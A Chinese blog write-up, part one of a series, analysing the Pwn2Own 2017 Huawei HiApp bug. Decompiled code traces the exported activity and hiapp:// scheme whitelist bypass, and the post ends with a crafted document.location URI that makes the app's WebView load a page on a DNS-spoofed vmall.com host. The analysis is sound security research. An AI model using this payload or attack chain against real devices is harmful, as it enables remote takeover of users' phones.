---
title: Pwn2Own华为HiApp漏洞原理与利用分析(上)
date: 2018-10-03 09:49:25
tags: Android漏洞
categories: 漏洞分析
---

### 0x01 简介
ps:本文从攻击者的角度来分析如何发现Pwn2Own华为手机漏洞，但不代表与漏洞发现者的思路相同，仅供参考。本系列漏洞分析由于涉及大量代码分析，所以拆分为四部分，也比较容易阅读和理解消化。

攻击视频详细可参见[Pwn2own Blog](https://www.thezdi.com/blog/2017/11/2/the-results-mobile-pwn2own-2017-day-two)

官方公告: [http://www.huawei.com/en/psirt/security-advisories/huawei-sa-20171120-01-hwreader-en](http://www.huawei.com/en/psirt/security-advisories/huawei-sa-20171120-01-hwreader-en)

漏洞可直接造成任意目录遍历、删除、任意代码执行等高危操作

<!-- more -->


漏洞版本:

* Huawei Read – 8.0.1.303* HiApp – 7.3.0.305

### 0x01 漏洞分析

#### 第一部分 HiApp白名单绕过

首先找到切入点，即AndroidManifest.xml中，审计发现有一个Activity暴露了出来(默认exported = true),依此作为切入点，进入到
`com.huawei.appmarket.service.externalapi.view.ThirdApiActivity` 中查看源代码进行分析。

``` xml
<activity android:configChanges="orientation|screenSize" android:launchMode="singleTop" android:name="com.huawei.appmarket.service.externalapi.view.ThirdApiActivity" android:theme="@style/loading_activity_style">
<intent-filter>
	<action android:name="android.intent.action.VIEW" />
	<category android:name="android.intent.category.DEFAULT" />
	<category android:name="android.intent.category.BROWSABLE" />
	<data android:host="details" android:scheme="appmarket" />
	<data android:host="search" android:scheme="market" />
	<data android:host="a.vmall.com" android:scheme="https" />
	<data android:host="com.huawei.appmarket" android:scheme="hiapp" />
</intent-filter>
```

切入`ThirdApiActivity.java`

``` java

protected void onCreate(Bundle arg2) {
    this.setTitle();
    this.protocolPolicy = DefaultProtocolPolicy.getProtocolPolicy();
    this.protocolPolicy.onCreate(this, arg2);  // 初始化了protocolPolicy
    super.onCreate(arg2);
}

public void onCreateContinue() {
    this.action = ExternalActionController.getAction(((CallBack)this));  // 初始化action
    if(this.action == null) {
        this.finish();
    }
    else {
        this.protocolPolicy.check(this, this.action.useCacheProtocol()); //切入关键点
    }
}
```

接着进入check函数进行查看，可以看到经过函数**l.a()**检查后，回调onAgree函数

``` java
public void check(ThirdApiActivity mThirdApiActivity, boolean flag) {
        if(!l.a()) {
            mThirdApiActivity.onShow();
            l.a(mThirdApiActivity.getActivity(), new ProtocolResultHandler(((IProtocolCheck)mThirdApiActivity)));
        }
        else {
            mThirdApiActivity.onAgree();
        }
}
```
而后onAgree函数调用了this.action的onAction函数。那么我们的目标就是需要追踪到对应action类的onAction函数再分析其逻辑，方法是先查看上述getAction函数，找出对应action的类。

``` java
public static IExternalAction getAction(CallBack callBack) {
        ... //代表省略一些无关代码，简化阅读
        Intent intent = callBack.getIntent();
        ...
        String action = intent.getAction();
        if(TextUtils.isEmpty(((CharSequence)action))) {
            action = "com.huawei.appmarket.ext.public";
        }

        Object clazz = ExternalActionController.ACTIVITY_MAPS.get(action);//关键在这里获取到Action对应的Class，也即由ACTIVITY_MAPS中获取
        ...
        clazz = ((Class)clazz).getConstructor(CallBack.class).newInstance(callBack);
        return clazz;
 }
```

那么接下来的思路就是获取ACTIVITY_MAPS的内容，首先自然需要找到put值的地方，然后通过寻找引用就能找到赋值的地方。

``` java
public static void register(String arg1, Class arg2) {
        ExternalActionController.ACTIVITY_MAPS.put(arg1, arg2);
}
```

通过查找register函数的引用,即可查找到init函数调用该函数进行注册，具体有两处，如下代码。可以看到，响应**android.intent.action.VIEW**这个Action的类有两个，分别是ViewAction.class和
AppViewAction.class,实际上二者为子父类关系。

``` java
public static void init() {
        ExternalActionController.register("com.huawei.appmarket.ext.public", ExtPublicAction.class);
        ExternalActionController.register("com.huawei.appmarket.intent.action.AppDetail", AppDetailAction.class);
        ExternalActionController.register("com.huawei.appmarket.appmarket.intent.action.AppDetail.withapp", AppDetailAction.class);
        ExternalActionController.register("com.huawei.appmarket.appmarket.intent.action.AppDetail.withid", AppDetailAction.class);
        ExternalActionController.register("com.huawei.appmarket.appmarket.intent.action.AppDetail.withURL", AppDetailAction.class);
        ExternalActionController.register("com.huawei.appmarket.appmarket.intent.action.AppDetail.withdetailId", AppDetailAction.class);
        ExternalActionController.register("android.intent.action.VIEW", ViewAction.class);
        ExternalActionController.register("com.huawei.appmarket.service.externalapi.actions.AppUninstallAction", AppUninstallAction.class);
        ExternalActionController.register("com.huawei.appmarket.intent.action.PROTOCOL", ProtocolAction.class);
        ExternalActionController.register("com.huawei.appmarket.intent.action.LOGIN", LoginAction.class);
        ExternalActionController.register(ActionName.BATCH_UPDATE_ACTION, BatchUpdateAction.class);
        ExternalActionController.register(ActionName.UPDATE_APP_ACTION, UpdateAppAction.class);
    }

public static void init() {
        ExternalActionController.register("com.huawei.appmarket.appmarket.intent.action.appmovemanager", AppMoveAction.class);
        ExternalActionController.register("com.huawei.appmarket.emui.barcode.result", EMUIBarCodeAction.class);
        ExternalActionController.register("com.huawei.appmarket.service.appmgr.apkmanagement.activity.apkmanagement", ApkManagerAction.class);
        ExternalActionController.register("com.huawei.appmarket.intent.action.launcher.downloadmanager", LauncherManagerApp.class);
        ExternalActionController.register("com.huawei.appmarket.appmarket.intent.action.appmanager", AppUpdateAction.class);
        ExternalActionController.register("com.huawei.appmarket.appmarket.intent.action.SearchActivity", SearchAction.class);
        ExternalActionController.register("com.huawei.appmarket.service.externalapi.actions.PayZoneAction", PayZoneAction.class);
        ExternalActionController.register("android.intent.action.VIEW", AppViewAction.class);
        ExternalActionController.register("com.huawei.appmarket.intent.action.ThirdUpdateAction", ThirdAppUpdateAction.class);
    }
```

通过上面我们知道响应**android.intent.action.VIEW**这个Action的类为ViewAction.class,也即是调用了ViewAction.onAction。

``` java
public void onAction() {
        Intent intent = this.callback.getIntent();
        uri = intent.getData();
        ...
       
        String scheme = uri.getScheme();
        String host = uri.getHost();
        ... 
        this.handlerUri(uri, scheme, host);  // 注意这里实际上是调用AppViewAction.handlerUri处理自定义的url
        ...
    }
```
到这里，实际就快要接近我们的目标，处理自定义scheme的地方。下面是关键的handlerUri函数

```java
protected void handlerUri(Uri uri, String scheme, String host) {  // 处理hiapp协议
        if(("https".equals(scheme)) && ("a.vmall.com".equals(host))) {
            this.openActivityByUrl(uri);
            return;
        }

        if(("hiapp".equals(scheme)) && ("com.huawei.appmarket".equals(host))) {
            String activityName = uri.getQueryParameter("activityName");
            String params = uri.getQueryParameter("params");
            String channelId = uri.getQueryParameter("channelId");
            if(!TextUtils.isEmpty(((CharSequence)activityName))) {
                JSONArray jsonArry = null;
                try {
                    if(!TextUtils.isEmpty(((CharSequence)params))) {
                        jsonArry = new JSONObject(params).getJSONArray("params");
                    }

                    e.a().c(channelId);
                    a.c("AppViewAction", "open hiapp:" + activityName);
                    com.huawei.appmarket.service.activitydispatcher.OpenGateway$b classB = OpenGateway.a(activityName, jsonArry);//这里注意一个点，传进去的第二参数是jsonArry,该调用链里进行处理成Param类,第三阶段构造参数的时候会讲到。
                    if(classB == null) {
                        goto label_47;
                    }

                    if(classB.getClassI() != null) {
                        this.callback.startActivity(classB.getClassI(), 0);  // 启动对应的Activity
                        goto label_47;
                    }

                    if(classB.getIntent() != null) {
                        this.callback.startActivity(classB.getIntent());  // 启动对应的Activity
                        goto label_47;
                    }

                    a.e("AppViewAction", "can not start target activity.Go MainActivity");
                }
                catch(JSONException v0_1) {
                    a.e("AppViewAction", "can not get params:" + v0_1.toString());
                }
            }
            else {
                a.e("AppViewAction", "can not find activityName.");
            }

        label_47:
            this.callback.finish();
        }
    }
```
那么现在的问题是，调用了startActivity去启动，activityName是怎么控制的，启动的又是哪个具体的Activity，换言之，我们可以控制去启动什么Activity。
由上面代码可知，关键点为:**com.huawei.appmarket.service.activitydispatcher.OpenGateway$b classB = OpenGateway.a(activityName, jsonArry)**
也即此处的classB就是我们可以控制启动的Activity

跟进这个函数，往下跟可以看到：

``` java
OpenGateway.class
int index = activityName.indexOf(124); // ascii码124是: |
        if(index != -1) {
            Class Claazz = OpenGateway.getFromMap(activityName.substring(0, index));  // 从可以启动的ActivityMap中取出activityName对应的class
            if(Claazz != null) {
                String v0_1 = "";
                String activityNameValue = activityName.length() >= index + 1 ? activityName.substring(index + 1) : v0_1;
                try {
                    return Claazz.newInstance().a(activityNameValue, paramLst);//关键的调用方法，也是我们接下来解析的重点
                }
...

private static Class getFromMap(String arg1) {
        return OpenGateway.ACTIVITYMAP.get(arg1);
}
```
思路一样，我们先找到put值的地方。

``` java
OpenGateway.class
public static void a(String arg1, Class arg2) {
        OpenGateway.ACTIVITYMAP.put(arg1, arg2);
    }
```

查看该函数的引用

``` java
public static void a() {
   OpenGateway.a("activityName", com.huawei.appmarket.service.activitydispatcher.b.a.class);
   OpenGateway.a("activityUri", com.huawei.appmarket.service.activitydispatcher.b.b.class);
}
```
根据以上,Clazz.newInstance().a(activityNameValue, paramLst);这里的a方法由参数activityName单竖号(|)前的值控制,可为activityUri或activityName,而单竖号后的值，控制着要启动的Activity。

到这里我们先小结一下,根据上面的代码跟踪，我们可以构造的自定义Uri类似于:

``` 
hiapp://com.huawei.appmarket?activityName=activityUri|xxxxxxx&params={}&channelId=1
或者
hiapp://com.huawei.appmarket?activityName=activityName|xxxxxxx&params={}&channelId=1

```

接下来我们第二阶段的目标就是弄清楚,单竖号后的值应该怎么构造？第三阶段目标是弄清楚params怎么构造？

我们跟进com.huawei.appmarket.service.activitydispatcher.b.b.class的a方法查看.

```java
public com.huawei.appmarket.service.activitydispatcher.OpenGateway$b a(String activity, List paramLst) {
        i classI;
        com.huawei.appmarket.service.activitydispatcher.OpenGateway$b relClass = null;
        if(TextUtils.isEmpty(((CharSequence)activity))) {
            com.huawei.appmarket.sdk.foundation.b.a.a.a.e("ActivityUriProvider", "activityUri is NULL");
        }
        else if(c.b(activity) == null) {
            com.huawei.appmarket.sdk.foundation.b.a.a.a.e("ActivityUriProvider", "can not find activityUri:" + activity);  // 在ActivityUriProvider中(实际上是个map)查询activity是否存在
        }
        else {
            com.huawei.appmarket.service.activitydispatcher.OpenGateway$b tmpB = new com.huawei.appmarket.service.activitydispatcher.OpenGateway$b();
            if(paramLst != null) {
                Bundle b = new Bundle();//构造bundle传递params参数
                if(b.a(paramLst, b)) {//这里的b.a函数处理params参数，实际上调用的是a.a
                    classI = new i(activity, new k(activity).a(b).b());
                }
                else {
                    com.huawei.appmarket.sdk.foundation.b.a.a.a.e("ActivityUriProvider", "param error,goMainActivity");
                    return relClass;
                }
            }
            else {
                classI = new i(activity, new k(activity).a().b());
            }

            tmpB.a(classI);  // setClassI
            relClass = tmpB;
        }

        return relClass;
    }
```

这里可以分析到c.b(activity)即是允许构造的activity名称检验，跟进这条调用链，同样是map，思路同上，这里直接给出结果如下:

``` java
public class a {
    public static void a() {
        c.a("installmgr.activity", AppInstallActivity.class);
        c.a("updatemgr.activity", AppUpdateActivity.class);
        c.a("appmove.activity", AppMoveActivity.class);
        c.a("hisuiteconnect.activity", HiSuiteConnectActivity.class);
        c.a("main.activity", MainActivity.class);
        c.a("gameboxmain.activity", GameBoxMainActivity.class);
        c.a("market.activity", MarketActivity.class);
        c.a("gamebox.activity", GameBoxActivity.class);
        c.a("appzone.activity", AppZoneActivity.class);
        c.a("game.h5.error.activity", GameH5ErrorActivity.class);
        c.a("thirdappupdate.activity", ThirdUpdateActivity.class);
        c.b("wlanapplist.fragment", d.class);
        c.b("marketpersonal.fragment", MarketPersonalFragment.class);
        c.b("marketpersonaloversea.fragment", MarketPersonalFragmentOversea.class);
        c.b("manager.fragment", ManagerFragment.class);
        c.b("paymentapplist.fragment", com.huawei.appmarket.service.paymentapp.a.class);
    }
}
public class a {
    public static void a() {
        c.a("gamereserved.activity", AppReservedActivity.class);
        c.a("purchasehistory.activity", PurchaseHistoryActivity.class);
        c.a("apptraceedit.activity", AppTraceEditActivity.class);
        c.a("permissions.activity", PermissionsActivity.class);
        c.a("pushmessage.activity", PushMessageActivity.class);
        c.a("pushdownloadalert.activity", PushDownloadAlertActivity.class);
        c.a("appdetail.activity", AppDetailActivity.class);
        c.a("appdetailreply.activity", AppDetailReplyActivity.class);
        c.a("video.activity", VideoActivity.class);
        c.a("installfailed.activity", InstallFailDescriptionActivity.class);
        c.a("share_dialog.activity", ShareDialogActivity.class);
        c.a("sns_share_dialog.activity", SnsShareDialogActivity.class);
        c.a("weibo_share_dialog.activity", WeiboShareDialogActivity.class);
        c.a("gallery.activity", GalleryActivity.class);
        c.a("apkmgr.activity", ApkManagementActivity.class);
        c.a("third_app_download.activity", ThirdAppDownloadActivity.class);
        c.a("child.mode.proxy.activity", ProxyActivity.class);
        c.a("webview.activity", WebViewActivity.class);
        c.a("search.activity", SearchActivity.class);
        c.b("gamereserved.fragment", b.class);
        c.b("updatemgr.fragment", UpdateManagerFragment.class);
        c.b("apptraceleftlist.fragment", com.huawei.appmarket.service.pay.purchase.a.class);
        c.b("apptracerightlist.fragment", com.huawei.appmarket.service.pay.purchase.a.class);
        c.b("appzonelist.fragment", com.huawei.appmarket.service.pay.purchase.c.class);
        c.b("appzoneeditlist.fragment", com.huawei.appmarket.service.pay.purchase.b.class);
        c.b("applist.fragment", com.huawei.appmarket.framework.fragment.b.class);
        c.b("appcategory.fragment", AppCategoryFragment.class);
        c.b("appdetail.fragment", AppDetailFragment.class);
        c.b("appsubcategory.fragment", AppSubCategoryFragment.class);
        c.b("appcomment.fragment", AppCommentFragment.class);
        c.b("appintroduce.fragment", AppIntroduceFragment.class);
        c.b("apprecommend.fragment", AppRecommendFragment.class);
        c.b("appreply.fragment", AppReplyFragment.class);
        c.b("appnocontent.fragment", AppNoContentFragment.class);
        c.b("loading.fragment", j.class);
        c.b("loadingex.fragment", LoadingFragmentEx.class);
        c.b("Tipsloading.fragment", n.class);
        c.b("installfailed.fragment", d.class);
        c.b("tabapplist.fragment", l.class);
        c.b("hotword.fragment", e.class);
        c.b("autocomplete.fragment", com.huawei.appmarket.service.search.view.a.a.class);
        c.b("search.fragment", com.huawei.appmarket.service.search.view.a.c.class);
        c.b("searchresult.fragment", g.class);
    }
}
```
第一个参数即是我们可以控制的欲启动的activity的值(单竖号后的值)

第三阶段，我们需要弄明白怎么去构造params参数里的值，在handlerUri函数传进来的是jsonArry,之后经过处理后变成Param类，再构造成Bundle.

``` java
@Nullable private static List a(JSONArray inJsonArry) {
        ArrayList v0_2;
        List v0 = null;
        if(inJsonArry != null && inJsonArry.length() > 0) {
            ArrayList relLst = new ArrayList();
            int i;
            for(i = 0; i < inJsonArry.length(); ++i) {
                try {
                    JSONObject jsonObj = inJsonArry.getJSONObject(i);
                    Param param = new Param();
                    param.fromJson(jsonObj);
                    ((List)relLst).add(param);
                }
                ...
        return ((List)v0_2);
    }
    
b.a(paramLst, b) 函数实际为b的父类a，也即调用了a.a方法，讲Param类参数设置进bundle中。
```

查看Param类可知,我们可构造的参数有

``` java
private String iv;
private String name;
private String type;
private String value;
```
至此，我们最终构造的uri为:

``` html
hiapp://com.huawei.appmarket?activityName=activityUri|webview.activity&params={'params' : [ { 'name' : 'xxx', 'type' : 'xxx', 'value' : 'xxx' }, { 'name' : 'xxx', 'type' : 'xxx', 'value' : 'xxxx' } ] }&channelId=1
```
小结一下:我们从之前代码分析可知，这里能控制的参数是非常多以及涉及到很多类，因此是有比较大的攻击面。

由于是顺着漏洞作者发现的漏洞进行分析，所以这里进入分析webview.activity所启动的类，也即如何来构造各个值，达到控制的结果。

跟进 WebViewActivity.class

``` java
protected void onCreate(Bundle arg4) {  
        super.onCreate(arg4);
        Request request = this.getProtocol().getRequest();  // this.delegate.a();
        this.mWebvewDelegate = this.createDelegate(request);  // webViewDelegate 初始化为具体的类
        if(this.mWebvewDelegate == null) {
            a.e(WebViewActivity.TAG, "mWebvewDelegate is null,uri=" + this.mDelegateUri);
        }
        else {
            String url = request.getUrl();  // 获取到第二个参数url
            if(!g.isEmpty(url)) {
                if(!this.mWebvewDelegate.check(((Context)this), request)) {  
                    this.finish();
                }
                else {
                    this.mWebvewDelegate.onCreate(((Context)this), request);
                    this.setContentView();
                    this.mWebvewDelegate.initView(((Context)this), request);//我是彩蛋
                    this.mWebvewDelegate.loadPage(url);  // 加载url
                }
            }
        }
    }
```

这里有个步骤是怎么把传过来的bundle转换成request并作处理，这一部分不做分析，读者可自行尝试。
实际上这里仅需要构造两个参数uri和url,uri控制着启动Activity,url控制着需要load的页面。

``` java
public class WebviewConfig {
    public WebviewConfig() {
        super();
    }
//第一个参数即为uri
    public static void init() {
        WebviewFactory.INSTANCE.registerDelegate("internal_webview", InternalWebviewDelegate.class);  // internal_webview
        WebviewFactory.INSTANCE.registerDelegate("external_webview", InternalWebviewDelegate.class);
        WebviewFactory.INSTANCE.registerDelegate("user_privacy_webview", UserPrivacyWebviewDelegate.class);
    }
}
```
至此，我们最终可以构造的URI为:

``` java
document.location = "hiapp://com.huawei.appmarket?activityName=activityUri|webview.activity&params={'params' : [ { 'name' : 'uri', 'type' : 'String', 'value' : 'internal_webview' }, { 'name' : 'url', 'type' : 'String', 'value' : 'http://www.vmall.com:8000/stage2.html' } ] }&channelId=1";
```

可以看到，在loadPage之前是有安全性检验的，必须是指定的域名匹配后才能够通过，因此这里是没办法load自定义的url的。

但是,第一部分漏洞的关键点就是: 没有进行https通信,因此通过DNS欺骗劫持域名即可使该域名加载自己网页内容。(你没看错 这就没了 = =)


### 0x03 漏洞总结

* 一开始由组件暴露的ThirdApiActivity作为切入点进行漏洞挖掘。

* 经过该类代码分析后，发现由getAction函数返回对应的action并由该具体的action执行onAction函数。这里第一部分我们可以控制的地方就是这个action的值。

* 紧接着进入onAction函数调用了handleUri,这部分我们可以控制的是activityName或activityUri，从而控制启动什么样的activity。(响应ACTION.VIEW)

* 而被启动的Activity调用onCreate函数处理我们可以控制的params参数。依此我们可以巧妙地构造攻击链。

第二部分的漏洞分析敬请期待。

### 0x04 参考
[https://labs.mwrinfosecurity.com/assets/BlogFiles/huawei-mate9pro-pwn2own-write-up-final-2018-04-26.pdf ](https://labs.mwrinfosecurity.com/assets/BlogFiles/huawei-mate9pro-pwn2own-write-up-final-2018-04-26.pdf)

[Android业务组件化之URL Scheme使用](https://www.cnblogs.com/whoislcj/p/5825333.html)

### 0x05 声明
本文章仅做学习研究用途，其他非法用途，本人概不负责。建议华为手机用户尽快更新HiApp以及IReader应用，以免遭到入侵控制，造成损失。